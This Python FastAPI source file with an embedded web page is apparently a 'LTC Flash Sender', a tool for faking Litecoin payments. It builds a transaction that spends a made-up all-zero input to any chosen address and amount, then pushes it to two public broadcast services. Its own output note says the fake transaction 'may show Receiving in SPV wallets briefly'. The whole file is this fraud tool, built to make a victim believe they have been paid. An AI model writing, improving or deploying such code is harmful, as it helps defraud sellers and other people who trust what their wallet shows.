from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import requests, hashlib, struct
from binascii import hexlify, unhexlify

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

LTC_PUBKEY_HASH = b'\x30'

def dsha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def encode_varint(n):
    if n < 0xfd:
        return bytes([n])
    elif n <= 0xffff:
        return b'\xfd' + struct.pack("<H", n)
    elif n <= 0xffffffff:
        return b'\xfe' + struct.pack("<I", n)
    else:
        return b'\xff' + struct.pack("<Q", n)

def base58_decode(addr):
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = 0
    for c in addr:
        num = num * 58 + alphabet.index(c)
    result = num.to_bytes((num.bit_length() + 7) // 8, 'big')
    for c in addr:
        if c == '1':
            result = b'\x00' + result
        else:
            break
    return result

def make_tx(version, inputs, outputs, locktime=0):
    tx = struct.pack("<I", version)
    tx += encode_varint(len(inputs))
    for i in inputs:
        tx += unhexlify(i['txid'])[::-1]
        tx += struct.pack("<I", i['vout'])
        script = i['script'] if isinstance(i['script'], bytes) else unhexlify(i['script'])
        tx += encode_varint(len(script)) + script
        tx += struct.pack("<I", i['sequence'])
    tx += encode_varint(len(outputs))
    for o in outputs:
        tx += struct.pack("<q", int(o['value'] * 1e8))
        script = o['script'] if isinstance(o['script'], bytes) else unhexlify(o['script'])
        tx += encode_varint(len(script)) + script
    tx += struct.pack("<I", locktime)
    return tx

@app.post("/flash")
async def flash(request: Request):
    body = await request.json()
    addr = body.get("address")
    amt = float(body.get("amount", 0))
    
    if not addr or not addr.startswith('L'):
        return {"error": "Invalid LTC address"}
    
    addr_bytes = base58_decode(addr)
    if len(addr_bytes) < 25:
        return {"error": "Invalid address length"}
    
    hash160 = addr_bytes[1:21]
    checksum = addr_bytes[21:25]
    verify = dsha256(LTC_PUBKEY_HASH + hash160)[:4]
    if checksum != verify:
        return {"error": "Checksum failed"}
    
    script_pubkey = bytes([0x76, 0xa9, 0x14]) + hash160 + bytes([0x88, 0xac])
    
    fake_input = {
        "txid": "0" * 64,
        "vout": 0,
        "script": b'',
        "sequence": 0xffffffff
    }
    
    outputs = [{
        "value": amt,
        "script": hexlify(script_pubkey).decode()
    }]
    
    tx = make_tx(2, [fake_input], outputs)
    txid = hexlify(dsha256(tx)[::-1]).decode()
    hex_tx = hexlify(tx).decode()
    
    results = []
    
    try:
        r = requests.post("https://api.blockcypher.com/v1/ltc/main/txs/push", 
                         json={"tx": hex_tx}, timeout=10)
        results.append({"endpoint": "blockcypher", "status": r.status_code, "resp": r.text[:300]})
    except Exception as e:
        results.append({"endpoint": "blockcypher", "error": str(e)})
    
    try:
        r = requests.post("https://sochain.com/api/v2/send_tx/LTC", 
                         json={"tx_hex": hex_tx}, timeout=10)
        results.append({"endpoint": "sochain", "status": r.status_code, "resp": r.text[:300]})
    except Exception as e:
        results.append({"endpoint": "sochain", "error": str(e)})
    
    return {
        "txid": txid,
        "hex": hex_tx,
        "target": addr,
        "amount": amt,
        "broadcast_attempts": results,
        "note": "Fake tx with invalid inputs. May show 'Receiving' in SPV wallets briefly."
    }

@app.get("/")
async def root():
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LTC Flash</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff88; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #111; border: 1px solid #00ff88; border-radius: 8px; padding: 40px; width: 100%; max-width: 500px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.1); }
        h1 { text-align: center; margin-bottom: 30px; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        input { width: 100%; background: #000; border: 1px solid #00ff88; color: #00ff88; padding: 12px; font-family: inherit; font-size: 14px; outline: none; }
        input:focus { box-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
        button { width: 100%; background: #00ff88; color: #000; border: none; padding: 14px; font-family: inherit; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; margin-top: 10px; }
        button:hover { background: #00cc66; }
        button:disabled { background: #004d33; cursor: not-allowed; }
        #result { margin-top: 25px; padding: 15px; background: #000; border: 1px solid #00ff88; font-size: 11px; word-break: break-all; line-height: 1.6; display: none; }
        #result.active { display: block; }
        .error { color: #ff0044; border-color: #ff0044; }
        .loading { text-align: center; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>LTC Flash Sender</h1>
        <div class="input-group">
            <label>Target Address</label>
            <input type="text" id="addr" placeholder="L..." autocomplete="off">
        </div>
        <div class="input-group">
            <label>Amount (LTC)</label>
            <input type="number" id="amt" placeholder="0.00" step="0.001">
        </div>
        <button onclick="flash()" id="btn">INITIATE</button>
        <div id="result"></div>
    </div>
    <script>
        async function flash() {
            const addr = document.getElementById('addr').value.trim();
            const amt = parseFloat(document.getElementById('amt').value);
            const result = document.getElementById('result');
            const btn = document.getElementById('btn');

            if (!addr || !addr.startsWith('L')) {
                result.className = 'active error';
                result.innerHTML = 'ERROR: Invalid LTC address. Must start with L.';
                return;
            }
            if (!amt || amt <= 0) {
                result.className = 'active error';
                result.innerHTML = 'ERROR: Amount must be greater than 0.';
                return;
            }

            btn.disabled = true;
            result.className = 'active';
            result.innerHTML = '<div class="loading">BROADCASTING TO NETWORK...</div>';

            try {
                const r = await fetch('/flash', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: addr, amount: amt })
                });
                
                const j = await r.json();
                
                if (j.error) {
                    result.className = 'active error';
                    result.innerHTML = 'ERROR: ' + j.error;
                } else {
                    result.className = 'active';
                    result.innerHTML = '<b>TXID:</b> ' + j.txid + '<br><br><b>TARGET:</b> ' + j.target + '<br><b>AMOUNT:</b> ' + j.amount + ' LTC<br><br><b>HEX:</b> ' + j.hex + '<br><br><b>BROADCAST STATUS:</b><br>' + j.broadcast_attempts.map(a => a.endpoint + ': ' + (a.status || a.error) + '<br>').join('') + '<br><i>' + j.note + '</i>';
                }
            } catch (e) {
                result.className = 'active error';
                result.innerHTML = 'ERROR: ' + e.message;
            } finally {
                btn.disabled = false;
            }
        }

        document.getElementById('addr').addEventListener('keypress', (e) => { if (e.key === 'Enter') flash(); });
        document.getElementById('amt').addEventListener('keypress', (e) => { if (e.key === 'Enter') flash(); });
    </script>
</body>
</html>"""
    return HTMLResponse(content=html)
